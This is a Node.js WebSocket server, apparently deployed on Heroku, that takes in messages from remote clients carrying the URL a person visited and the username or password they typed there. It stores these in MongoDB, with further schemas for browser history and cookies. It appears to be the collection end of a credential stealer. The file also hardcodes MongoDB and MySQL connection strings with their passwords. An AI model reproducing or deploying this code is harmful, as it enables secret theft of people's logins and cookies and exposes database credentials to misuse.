'use strict';
/*
URL = https://projectnickname123.herokuapp.com
If recieveing port in use error
type this in cmd
taskkill /F /IM node.exe

HELPFUL COMMANDS:
heroku local =hosts the server locally user, access using localhost:5000 
IMPORTANT: ALWAYSALWAYSALWAYSALWAYS test on locally before deploying onto heroku
heroku open = opens the url of deployed app
heroku logs --tail = shows logs of server

To push and deploy to heroku and github
git add .
git commit -m "commit message"
git push heroku master
git push origin master
*/
const express = require('express');
const SocketServer = require('ws').Server;
const path = require('path');
//var mysql = require('mysql');
//var mongodb = require('mongodb');
//var MongoClient = mongodb.MongoClient;
var uri = 'mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j';
var mongoose = require ("mongoose");

const PORT = process.env.PORT || 3000;
const INDEX = path.join(__dirname, 'index.html');
const WebSocket = require('ws');

const server = express()
  .use((req, res) => res.sendFile(INDEX) )
  .listen(PORT, () => console.log(`Listening on ${ PORT }`));

var app = express();
const wss = new SocketServer({ server });

//TERMINOLOGY FOR MONGODB
//collection=table
//document=row

var clientStatus = new mongoose.Schema({//Schemas are predefined json formats that the mongodc collections use, not all fields/values need to be filled out in order to push data to db
    id: {type: Number},
    status: { type: String}
  });
  /*
var clientUsername = new mongoose.Schema({
    id: {type: Number},
    url: { type: String},
    username: {type: String}
  });
var clientPassword = new mongoose.Schema({
    id: {type: Number},
    url: { type: String},
    password: {type: String}
  });
  */
var clientHistory = new mongoose.Schema({
    id: {type: Number},
    url: { type: String},
    history: {type: [String]}
  });
  
var clientCookies = new mongoose.Schema({
    id: {type: Number},
    url: { type: String},
    name: {type: String},
    value: {type: String}
  });
var clientLogin = new mongoose.Schema({
    id: {type: Number},
    url: {type: String},
    username: {type: String},
    password: {type: String}
});

/*MONGODB LOGIN
host:ds037977.mlab.com
port:mlab.com
username:heroku_qk2c0q0j
password:i45p143m9dfcn4ocn1urpduu5c
database:heroku_qk2c0q0j
*/


mysql://b35b454793036b:91686762@us-cdbr-iron-east-01.cleardb.net/heroku_9059f11db120273?reconnect=true
mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j
/*
var mySQL_config = {
  host     : 'us-cdbr-iron-east-01.cleardb.net',
  user     : 'b35b454793036b',
  password : '91686762',
  database : 'heroku_9059f11db120273'
};
var connection;
function handleDisconnect() {
    console.log('1. connecting to db:');
    connection = mysql.createConnection(mongoDB_config); // Recreate the connection, since
													// the old one cannot be reused.

    connection.connect(function(err) {              	// The server is either down
        if (err) {                                     // or restarting (takes a while sometimes).
            console.log('2. error when connecting to db:', err);
            setTimeout(handleDisconnect, 1000); // We introduce a delay before attempting to reconnect,
        }                                     	// to avoid a hot loop, and to allow our node script to
    });                                     	// process asynchronous requests in the meantime.
    											// If you're also serving http, display a 503 error.
    connection.on('error', function(err) {
        console.log('3. db error');
        if (err.code === 'PROTOCOL_CONNECTION_LOST') { 	// Connection to the MySQL server is usually
            handleDisconnect();                      	// lost due to either server restart, or a
        } else {                                      	// connnection idle timeout (the wait_timeout
            throw err;                                  // server variable configures this)
        }
    });
}
*/
//handleDisconnect();
/*
MongoClient.connect(url, function (err, db) {
    if (err) {
      console.log('Unable to connect to the mongoDB server. Error:', err);
    } else {
      console.log('Connection established to', url);
  
      // do some work here with the database.
  
      //Close connection
      db.close();
    }
  });
  */


 mongoose.connect(uri, function (err, res) {//connect to db
    if (err) {
    console.log ('ERROR connecting to: ' + uri + '. ' + err);
    } else {
    console.log ('Succeeded connected to: ' + uri);
    }
  });
//var db = mongoose.connection;
var onlineClientsIDS = [];

var userStatus = mongoose.model('Client Status', clientStatus);
var userLogin = mongoose.model('Login Info', clientLogin);
//var userPassword = mongoose.model('Login Info', clientPassword);


wss.on('connection', function connection(ws) {//Upon a connection from a client
    
    console.log('Client connected');
    ws.on('message', function incoming(message) {//Upon a message from a client

        console.log('received: %s', message);
        //ws.send(message);
        try{
        var data = JSON.parse(message);//turn message into JSON
        } catch(e){//if data isint proper format
            console.log('wrong format detected')
            return;
        }
        //console.log(message);
        ws.id = data.id;//get client id
        if (onlineClientsIDS.indexOf(ws.id) === -1) {//checks to see if client is on online list, if not add it to lsit
            onlineClientsIDS.push(ws.id);
            var newUser = new userStatus ({
                id: ws.id,
                status : 'online'
              });
            newUser.save(function (err) {if (err) console.log ('Error on save!')});
        }
        else
            console.log("id is already online");

        var type = data.type;

        //if (type == 'history')//history list

        //if (type == 'cookie')//cookie

        if (type == 'username'){//if message is telling us that client typed in username
            ws.url=data.url;//get url from message
            ws.username=data.username;//get username from message
            var newUsername = new userLogin ({
                id: ws.id,
                url: ws.url,
                username: ws.username
            });
            userLogin.updateOne( { id: ws.id, url: ws.url }, 
                { username : ws.username }, { upsert : true }, function (err, hotel) {
                    //finds a document that matches id and url, if found, update username field
                    //if not found add such document
                console.log(newUsername+" sent to db");
            } );
            //newUsername.save(function (err) {if (err) console.log ('Error on save!')});
        }

        if (type == 'password'){//password
            ws.url=data.url;
            ws.password=data.password;
            var newPassword = new userLogin ({
                id: ws.id,
                logins:[
                    {
                    url: ws.url,
                    password: ws.password
                    }
                ]
            });
            newPassword.save(function (err) {if (err) console.log ('Error on save!')});
            console.log(newPassword+" sent to db");
        }


        //SENDING DATA

        wss.clients.forEach(function each(client) {//sends message back to ALL clients MUST CHANGE
            if (client.readyState === WebSocket.OPEN) {
                client.send(message);
            }
        });


    });

    ws.on('close', function (){ //when a client disconnects
        console.log('Client disconnected')});
        var index = onlineClientsIDS.indexOf(ws.id);
        if (index > -1) {//remove him from active clients array
            onlineClientsIDS.splice(index, 1);
        }

            
});
